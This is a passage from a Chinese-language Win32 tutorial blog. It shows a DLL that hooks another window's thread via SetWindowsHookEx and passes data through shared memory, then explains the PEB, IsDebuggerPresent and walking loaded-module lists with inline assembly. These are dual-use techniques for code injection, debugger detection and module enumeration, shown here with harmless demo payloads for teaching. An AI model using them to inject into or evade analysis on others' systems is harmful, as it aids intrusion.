class="line">	DWORD threadID = GetWindowThreadID(lpszWindowName);</span><br><span class="line">	<span class="keyword">if</span>(!threadID)</span><br><span class="line">	&#123;</span><br><span class="line">		MessageBox(<span class="literal">NULL</span>, <span class="string">&quot;获取目标进程PID失败!&quot;</span>, <span class="string">&quot;note&quot;</span>, MB_OK);</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	g_hHook = SetWindowsHookEx(idHook, (HOOKPROC)MessageProc, g_hModuleOfDll, threadID);</span><br><span class="line">	<span class="keyword">if</span> (<span class="literal">NULL</span> == g_hHook)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 卸载钩子</span></span><br><span class="line"><span class="function">BOOL <span class="title">UnsetGlobalHook</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (g_hHook)</span><br><span class="line">	&#123;</span><br><span class="line">		UnhookWindowsHookEx(g_hHook);</span><br><span class="line">		<span class="keyword">return</span> TRUE;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		<span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><strong>测试程序</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, CHAR* argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_SetGlobalHook)</span><span class="params">(<span class="keyword">int</span> idHook, LPSTR lpszWindowName)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_UnsetGlobalHook)</span><span class="params">()</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_Write)</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">DWORD</span><span class="params">(*typedef_Read)</span><span class="params">(LPSTR lpszBuff, DWORD dwBuffLen)</span></span>;</span><br><span class="line">	<span class="function"><span class="keyword">typedef</span> <span class="title">BOOL</span><span class="params">(*typedef_CreateSharedMemory)</span><span class="params">()</span></span>;</span><br><span class="line">	HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_SetGlobalHook SetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_UnsetGlobalHook UnsetGlobalHook = <span class="literal">NULL</span>;</span><br><span class="line">	typedef_CreateSharedMemory CreateSharedMemory;</span><br><span class="line">	typedef_Write Write;</span><br><span class="line">	typedef_Read Read;</span><br><span class="line">	DWORD dwBuffLen;</span><br><span class="line">	BYTE szBuff[<span class="number">100</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">	BOOL bRet = FALSE;</span><br><span class="line">	LPSTR lpszWindowName = <span class="string">&quot;mfc&quot;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		hDll = ::LoadLibrary(<span class="string">&quot;C:\\vc6++\\MyProjects\\GlobalHook\\Debug\\GlobalHook.dll&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == hDll)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;LoadLibrary Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		SetGlobalHook = (typedef_SetGlobalHook)::GetProcAddress(hDll, <span class="string">&quot;SetGlobalHook&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == SetGlobalHook)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = SetGlobalHook(WH_CALLWNDPROC, lpszWindowName);</span><br><span class="line">		<span class="keyword">if</span> (bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;SetGlobalHook ERROR.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//write buff</span></span><br><span class="line">		Write = (typedef_Write)GetProcAddress(hDll, <span class="string">&quot;Write&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == Write)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">		bRet = Write(<span class="string">&quot;haha,walker!&quot;</span>, <span class="number">0x20</span>);</span><br><span class="line">		<span class="keyword">if</span> (bRet)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;write success.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;write error.\n&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">		// read buff</span></span><br><span class="line"><span class="comment">		Read = (typedef_Read)GetProcAddress(hDll, &quot;Read&quot;);</span></span><br><span class="line"><span class="comment">		if (NULL == Read)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;GetProcAddress Error[%d]\n&quot;, GetLastError());</span></span><br><span class="line"><span class="comment">			break;</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		</span></span><br><span class="line"><span class="comment">		dwBuffLen = sizeof(szBuff);</span></span><br><span class="line"><span class="comment">		dwBuffLen = Read((LPSTR)szBuff, dwBuffLen);</span></span><br><span class="line"><span class="comment">		if (dwBuffLen)</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;Read data: %s\n&quot;, szBuff);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">		else</span></span><br><span class="line"><span class="comment">		&#123;</span></span><br><span class="line"><span class="comment">			printf(&quot;Read error.\n&quot;);</span></span><br><span class="line"><span class="comment">		&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">		<span class="comment">//获取进程句柄</span></span><br><span class="line">		HWND hwnd = FindWindow(<span class="literal">NULL</span>, lpszWindowName);</span><br><span class="line">		<span class="keyword">if</span> (!hwnd)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//printf(&quot;获取进程句柄失败！\n&quot;);</span></span><br><span class="line">			<span class="keyword">return</span> FALSE;</span><br><span class="line">		&#125;</span><br><span class="line">		SendMessage(hwnd, WM_USER + <span class="number">0x1</span>, <span class="number">0x1234</span>, <span class="number">0x5678</span>);</span><br><span class="line"></span><br><span class="line">		UnsetGlobalHook = (typedef_UnsetGlobalHook)::GetProcAddress(hDll, <span class="string">&quot;UnsetGlobalHook&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="literal">NULL</span> == UnsetGlobalHook)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;GetProcAddress Error[%d]\n&quot;</span>, ::GetLastError());</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		bRet = UnsetGlobalHook();</span><br><span class="line">		<span class="keyword">if</span>(bRet)</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook OK.\n&quot;</span>);</span><br><span class="line">		<span class="keyword">else</span></span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;UnsetGlobalHook falied.\n&quot;</span>);</span><br><span class="line">		SendMessage(hwnd, WM_USER + <span class="number">0x1</span>, <span class="number">0x1234</span>, <span class="number">0x5678</span>);</span><br><span class="line">	&#125;<span class="keyword">while</span>(FALSE);</span><br><span class="line">	FreeLibrary(hDll);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<img src="/win32/Win32/image-20210225190048656.png" alt="image-20210225190048656" style="zoom:80%;" align="left">





<h3 id="进程描述信息"><a href="#进程描述信息" class="headerlink" title="进程描述信息"></a>进程描述信息</h3><p>进程描述信息的存储方式如下：</p>
<p><img src="/win32/Win32/%E8%BF%9B%E7%A8%8B%E6%8F%8F%E8%BF%B0%E4%BF%A1%E6%81%AF%EF%BC%88PEB%EF%BC%89.png" alt="进程描述信息（PEB）"></p>
<h4 id="PEB"><a href="#PEB" class="headerlink" title="_PEB"></a>_PEB</h4><p><code>PEB</code> 结构（<code>Process Envirorment Block Structure</code>），即进程环境信息块，其中包含进程的信息。该结构存储在 R3 下，供用户层使用。在  <code>R3</code> 下，<code>fs[0x30]</code> 指向 <code>_PEB</code> ，而在 <code>R0</code> 下，指向 <code>_KPCR</code> 。</p>
<p>32位系统下的 <code>PEB</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">  BYTE                          Reserved1[<span class="number">2</span>];</span><br><span class="line">  BYTE                          BeingDebugged;	<span class="comment">//进程是否被调试, 0:未调试, 1:正在被调试</span></span><br><span class="line">  BYTE                          Reserved2[<span class="number">1</span>];</span><br><span class="line">  PVOID                         Reserved3[<span class="number">2</span>];</span><br><span class="line">  PPEB_LDR_DATA                 Ldr;	<span class="comment">//指向PEB_LDR_DATA结构的指针，该结构包含有关该进程的已加载模块的信息</span></span><br><span class="line">  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;	</span><br><span class="line">    							<span class="comment">//指向包含过程参数信息（例如命令行）的RTL_USER_PROCESS_PARAMETERS结构的指针</span></span><br><span class="line">  PVOID                         Reserved4[<span class="number">3</span>];</span><br><span class="line">  PVOID                         AtlThunkSListPtr;</span><br><span class="line">  PVOID                         Reserved5;</span><br><span class="line">  ULONG                         Reserved6;</span><br><span class="line">  PVOID                         Reserved7;</span><br><span class="line">  ULONG                         Reserved8;</span><br><span class="line">  ULONG                         AtlThunkSListPtr32;</span><br><span class="line">  PVOID                         Reserved9[<span class="number">45</span>];</span><br><span class="line">  BYTE                          Reserved10[<span class="number">96</span>];</span><br><span class="line">  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">  BYTE                          Reserved11[<span class="number">128</span>];</span><br><span class="line">  PVOID                         Reserved12[<span class="number">1</span>];</span><br><span class="line">  ULONG                         SessionId;</span><br><span class="line">&#125; PEB, *PPEB;</span><br></pre></td></tr></table></figure>



<p>64位系统下的 <code>PEB</code> 的结构如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB</span> &#123;</span></span><br><span class="line">    BYTE Reserved1[<span class="number">2</span>];</span><br><span class="line">    BYTE BeingDebugged;</span><br><span class="line">    BYTE Reserved2[<span class="number">21</span>];</span><br><span class="line">    PPEB_LDR_DATA LoaderData;</span><br><span class="line">    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;</span><br><span class="line">    BYTE Reserved3[<span class="number">520</span>];</span><br><span class="line">    PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;</span><br><span class="line">    BYTE Reserved4[<span class="number">136</span>];</span><br><span class="line">    ULONG SessionId;</span><br><span class="line">&#125; PEB;</span><br></pre></td></tr></table></figure>



<h2 style="color:pink">检查进程是否被3环调试器调试</h2>

<p>我们可以利用 <code>IsDebuggerPresent </code> 函数检查本进程是否被3环调试器调试。</p>
<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	BOOL bRet = IsDebuggerPresent();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;ret: %u\n&quot;</span>, bRet);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>当进程没有被调试时：</p>
<img src="/win32/Win32/image-20210301142429269.png" alt="image-20210301142429269" style="zoom:80%;" align="left">

 

<p>当进程被调试时：</p>
<img src="/win32/Win32/image-20210301142555330.png" alt="image-20210301142555330" style="zoom:80%;" align="left">



<hr>
<p><strong>我们可以通过反汇编查看该函数是如何实现获取进程是否被调试的信息的。</strong></p>
<p>可以看到，该函数从 <code>fs</code> 段寄存器中获取的数据，<code>fs:[00000030h]</code> 正是该进程的 <code>PEB</code> 首地址，从首地址偏移2字节刚好是 <code>BeingDebugged</code>。</p>
<img src="/win32/Win32/image-20210301142816239.png" alt="image-20210301142816239" style="zoom:80%;" align="left">



<img src="/win32/Win32/image-20210301143337293.png" alt="image-20210301143337293" style="zoom:80%;" align="left">



<h4 id="PEB-LDR-DATA"><a href="#PEB-LDR-DATA" class="headerlink" title="_PEB_LDR_DATA"></a>_PEB_LDR_DATA</h4><p><code>_PEB</code> 中的 <code>ldr</code> 指向该结构，该结构包含有关该过程的已加载模块的信息。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span> &#123;</span></span><br><span class="line">  BYTE       Reserved1[<span class="number">8</span>];</span><br><span class="line">  PVOID      Reserved2[<span class="number">3</span>];</span><br><span class="line">  LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br></pre></td></tr></table></figure>



<p>内核模式下的 <code>_PEB_LDR_DATA</code> 结构如下：</p>
<img src="/win32/Win32/image-20210301144837645.png" alt="image-20210301144837645" style="zoom:80%;" align="left">

<p>需要注意的是，<code>InMemoryOrderModuleList, InInitializationOrderModuleList, InLoadOrderModuleList</code> 中存储的是该进程的初始模块描述表的首地址。</p>
<h4 id="LIST-ENTRY"><a href="#LIST-ENTRY" class="headerlink" title="_LIST_ENTRY"></a>_LIST_ENTRY</h4><p><code>_LIST_ENTRY </code> 结构指向双向链接列表，该列表用于索引进程中的模块项。列表中的每个项目都是指向 <strong>LDR_DATA_TABLE_ENTRY</strong> 结构的指针。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> &#123;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Flink</span>;</span></span><br><span class="line">   <span class="class"><span class="keyword">struct</span> _<span class="title">LIST_ENTRY</span> *<span class="title">Blink</span>;</span></span><br><span class="line">&#125; LIST_ENTRY, *PLIST_ENTRY, *RESTRICTED_POINTER PRLIST_ENTRY;</span><br></pre></td></tr></table></figure>



<h4 id="LDTE"><a href="#LDTE" class="headerlink" title="_LDTE"></a>_LDTE</h4><p><code>_LDR_DATA_TABLE_ENTRY</code>  结构用于描述进程中一个模块的信息，即当进程中有多个模块时，<code>_LDTE</code> 表就会有多张。这些 <code>_LDTE</code> 表由 <code>_LIST_ENTRY </code> 结构体中的结构性进行索引，可通过遍历 <code>_LDTE</code> 获取进程中的模块。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    PVOID Reserved1[<span class="number">2</span>];</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    PVOID Reserved2[<span class="number">2</span>];</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;</span><br><span class="line">    PVOID Reserved3;</span><br><span class="line">    UNICODE_STRING FullDllName;</span><br><span class="line">    BYTE Reserved4[<span class="number">8</span>];</span><br><span class="line">    PVOID Reserved5[<span class="number">3</span>];</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        ULONG CheckSum;</span><br><span class="line">        PVOID Reserved6;</span><br><span class="line">    &#125;;</span><br><span class="line">    ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br></pre></td></tr></table></figure>



<p>内核模式下的 <code>_LDR_DATA_TABLE_ENTRY</code> 结构如下：</p>
<img src="/win32/Win32/image-20210301145944169.png" alt="image-20210301145944169" style="zoom:80%;" align="left">



<h2 style="color:pink">遍历进程模块</h2>



<p>测试代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Locale.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 内核Unicode字符串结构体</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">UNICODE_STRING</span> &#123;</span></span><br><span class="line">	USHORT Length;</span><br><span class="line">	USHORT MaximumLength;</span><br><span class="line">	PWSTR Buffer;</span><br><span class="line">&#125; UNICODE_STRING, *PUNICODE_STRING;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ldr, 进程信息表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PEB_LDR_DATA</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	DWORD Length;</span><br><span class="line">	<span class="keyword">bool</span> Initialized;</span><br><span class="line">	PVOID SsHandle;</span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">&#125; PEB_LDR_DATA, *PPEB_LDR_DATA;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ldte, 模块信息表</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">	LIST_ENTRY InLoadOrderModuleList;</span><br><span class="line">	LIST_ENTRY InMemoryOrderModuleList;</span><br><span class="line">	LIST_ENTRY InInitializationOrderModuleList;</span><br><span class="line">	<span class="keyword">void</span>* BaseAddress;</span><br><span class="line">	<span class="keyword">void</span>* EntryPoint;</span><br><span class="line">	ULONG SizeOfImage;</span><br><span class="line">	UNICODE_STRING FullDllName;</span><br><span class="line">	UNICODE_STRING BaseDllName;</span><br><span class="line">	ULONG Flags;</span><br><span class="line">	SHORT LoadCount;</span><br><span class="line">	SHORT TlsIndex;</span><br><span class="line">	HANDLE SectionHandle;</span><br><span class="line">	ULONG CheckSum;</span><br><span class="line">	ULONG TimeDateStamp;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	_wsetlocale(LC_ALL, <span class="string">L&quot;chs&quot;</span>);</span><br><span class="line">	PPEB_LDR_DATA ldr;</span><br><span class="line">	PLDR_DATA_TABLE_ENTRY ldte;</span><br><span class="line"></span><br><span class="line">	__asm&#123;</span><br><span class="line">		pushad</span><br><span class="line">		pushfd</span><br><span class="line">		mov eax, fs: [<span class="number">0x30</span>] <span class="comment">// PEB </span></span><br><span class="line">		mov ecx, [eax + <span class="number">0x0c</span>] <span class="comment">// LDR</span></span><br><span class="line">		mov ldr, ecx</span><br><span class="line">		popfd</span><br><span class="line">		popad</span><br><span class="line">	&#125;</span><br><span class="line">	PLIST_ENTRY Header = &amp;(ldr-&gt;InLoadOrderModuleList);</span><br><span class="line">	PLIST_ENTRY Cur = Header;</span><br><span class="line">	<span class="keyword">do</span> </span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InLoadOrderModuleList);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;InLoadOrderModuleList dll name: %ws\n&quot;</span>, ldte-&gt;FullDllName.Buffer);</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Header = &amp;(ldr-&gt;InInitializationOrderModuleList);</span><br><span class="line">	Cur = Header;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InInitializationOrderModuleList);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;InInitializationOrderModuleList dll name: %ws\n&quot;</span>, ldte-&gt;FullDllName.Buffer);</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	Header = &amp;(ldr-&gt;InMemoryOrderModuleList);</span><br><span class="line">	Cur = Header;</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		ldte = CONTAINING_RECORD(Cur, LDR_DATA_TABLE_ENTRY, InMemoryOrderModuleList);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;InMemoryOrderModuleList dll name: %ws\n&quot;</span>, ldte-&gt;FullDllName.Buffer);</span><br><span class="line">		Cur = Cur-&gt;Blink;</span><br><span class="line">	&#125; <span class="keyword">while</span> (Header != Cur);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>可以看到，<code>_LDR_DATA_TABLE_ENTRY</code> 表中的第一张模块信息表是空表。</p>
<p><img src="/win32/Win32/image-20210301183627625.png" alt="image-20210301183627625"></p>
